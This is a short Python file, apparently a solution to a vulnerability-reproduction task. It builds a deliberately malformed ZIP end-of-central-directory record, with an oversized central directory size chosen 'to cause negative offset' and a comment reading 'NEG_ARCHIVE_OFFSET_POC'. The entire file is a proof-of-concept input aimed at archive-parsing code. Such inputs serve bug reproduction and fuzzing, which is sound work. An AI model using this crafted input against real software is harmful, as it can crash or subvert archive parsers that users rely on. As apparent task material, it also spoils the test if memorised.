import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = os.path.basename(src_path)
        return bytes([
            0x50, 0x4B, 0x05, 0x06,  # End of central directory signature
            0x00, 0x00,              # Number of this disk
            0x00, 0x00,              # Disk where central directory starts
            0x01, 0x00,              # Number of central directory records on this disk
            0x01, 0x00,              # Total number of central directory records
            0xF0, 0xFF, 0xFF, 0xFF,  # Size of central directory (very large to cause negative offset)
            0x00, 0x00, 0x00, 0x00,  # Offset of start of central directory
            0x18, 0x00,              # ZIP file comment length (24 bytes)
            # ZIP file comment (24 bytes)
            0x4E, 0x45, 0x47, 0x5F,  # 'NEG_'
            0x41, 0x52, 0x43, 0x48,  # 'ARCH'
            0x49, 0x56, 0x45, 0x5F,  # 'IVE_'
            0x4F, 0x46, 0x46, 0x53,  # 'OFFS'
            0x45, 0x54, 0x5F, 0x50,  # 'ET_P'
            0x4F, 0x43, 0x21, 0x21   # 'OC!!'
        ])